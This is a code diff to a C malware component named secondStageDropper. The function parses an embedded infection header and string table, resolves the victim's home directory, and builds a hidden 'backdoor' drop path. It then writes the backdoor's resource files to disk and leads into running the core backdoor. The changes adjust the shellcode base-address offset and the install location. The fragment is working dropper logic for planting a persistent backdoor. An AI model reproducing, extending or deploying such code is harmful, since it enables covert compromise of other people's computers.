@@ -469,7 +469,7 @@ void secondStageDropper ()
 #ifdef WIN32
   __asm__ __volatile__ {
     mov eax, [ebp+4]
-    sub eax, 0x76
+    sub eax, 0xD2
     mov [baseAddress], eax
   }
 #else
@@ -539,8 +539,7 @@ void secondStageDropper ()
   char *filePointer           = NULL;
   char *backdoorPath          = NULL;
   
-  unsigned int offset = (unsigned int)(baseAddress) + sizeof (infectionHeader);
-  
+  unsigned int offset         = (unsigned int)(baseAddress) + sizeof (infectionHeader);
   infectionHeader *infection  = (infectionHeader *)baseAddress;
   stringTable *stringList     = (stringTable *)offset;
   resourceHeader *resource    = NULL;
@@ -681,7 +680,7 @@ void secondStageDropper ()
               offset += sizeof (stringTable);
               stringList = (stringTable *)offset;
             }
-          
+
           offset = (unsigned int)baseAddress
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * infection->numberOfStrings
@@ -691,11 +690,19 @@ void secondStageDropper ()
           void *envVariableName = (char *)strings[0];
           
           if (igetenv != 0)
-            userHome = (char *) igetenv ((const char *)envVariableName);
+            {
+              userHome = (char *) igetenv ((const char *)envVariableName);
+            }
           else
-            doExit ();
+            {
+              doExit ();
+            }
+
+          char *backdoorDropPath = (char *)imalloc(128);
           
-          backdoorPath = (char *) imalloc (256);
+          isprintf(backdoorDropPath, strings[1], userHome, strings[4], strings[5]);
+
+          backdoorPath = (char *)imalloc (256);
           char *backdoorDir = NULL;
 
           //
@@ -707,16 +714,16 @@ void secondStageDropper ()
               destinationDir  = (char *) imalloc (128);
               
               resource = (resourceHeader *)offset;
-              isprintf (destinationDir, strings[1], userHome, resource->path);
+              isprintf (destinationDir, strings[2], backdoorDropPath, resource->path);
 
               if (backdoorDir == NULL)
                 {
                   backdoorDir = (char *)imalloc (256);
-                  isprintf (backdoorDir, strings[1], userHome, resource->path);
+                  isprintf (backdoorDir, strings[2], backdoorDropPath, resource->path);
                 }
 
               imkdir (destinationDir, 0755);
-              isprintf (destinationPath, strings[1], destinationDir, resource->name);
+              isprintf (destinationPath, strings[2], destinationDir, resource->name);
               
               if (resource->type == RESOURCE_CORE)
                 {
@@ -730,7 +737,7 @@ void secondStageDropper ()
                   if ((int)(filePointer = (char *)immap (0, resSize, PROT_READ | PROT_WRITE,
                                                          MAP_SHARED, fd, 0)) != -1)
                     {
-                      if (ipwrite (fd, strings[3], 1, resource->size - 1) == -1)
+                      if (ipwrite (fd, strings[6], 1, resource->size - 1) == -1)
                         {
                           iclose (fd);
                           doExit ();
@@ -754,6 +761,8 @@ void secondStageDropper ()
               ifree (destinationPath);
             }
           
+          ifree (backdoorDropPath);
+
           //
           // Execute the core backdoor file
           //
